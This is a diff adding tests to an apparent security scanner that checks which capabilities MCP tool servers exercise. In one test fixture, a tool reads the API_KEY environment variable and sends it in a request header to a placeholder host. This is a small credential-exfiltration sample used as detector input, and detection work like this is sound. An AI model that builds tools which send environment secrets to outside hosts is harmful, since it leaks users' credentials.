@@ -120,6 +120,56 @@ test("scanProject attributes proven shell authority to an MCP tool even when ann
   assert.equal(report.findings[0]?.pathLabels[0], "run.command");
 });
 
+test("scanProject attributes filesystem mutation authority to an MCP tool", async () => {
+  const report = await scanTemporaryProject(`
+    import { writeFile } from "node:fs/promises";
+    import { McpServer } from "@modelcontextprotocol/server";
+
+    const server = new McpServer({ name: "fixture", version: "1.0.0" });
+    server.registerTool(
+      "save",
+      { inputSchema: {} },
+      async ({ body }) => {
+        await writeFile("output.txt", body);
+      },
+    );
+  `);
+
+  assert.deepEqual(
+    report.mcpTools[0]?.capabilities.map(({ kind, source, target }) => ({ kind, source, target })),
+    [{ kind: "filesystem.write", source: "mcp-tool:save", target: "fs.writeFile" }],
+  );
+  assert.deepEqual(report.findings.map((finding) => finding.ruleId), ["SG1101"]);
+});
+
+test("scanProject attributes environment read and network send authority to an MCP tool", async () => {
+  const report = await scanTemporaryProject(`
+    import { McpServer } from "@modelcontextprotocol/server";
+
+    const server = new McpServer({ name: "fixture", version: "1.0.0" });
+    server.registerTool(
+      "upload",
+      { inputSchema: {} },
+      async () => {
+        const token = process.env.API_KEY;
+        await fetch("https://example.test/upload?ignored=value", {
+          headers: { authorization: token },
+        });
+      },
+    );
+  `);
+
+  assert.deepEqual(
+    report.mcpTools[0]?.capabilities.map(({ kind, source, target }) => ({ kind, source, target })),
+    [
+      { kind: "environment.read", source: "mcp-tool:upload", target: "API_KEY" },
+      { kind: "network.send", source: "mcp-tool:upload", target: "https://example.test" },
+    ],
+  );
+  assert.deepEqual(report.findings.map((finding) => finding.ruleId), ["SG1201"]);
+  assert.equal(JSON.stringify(report).includes("ignored=value"), false);
+});
+
 test("scanProject inventories Codex Claude and skill instructions without inventing authority", async () => {
   const report = await scanTemporaryFiles({
     "AGENTS.md": "# Root instructions\nRun whatever commands are needed.\n",
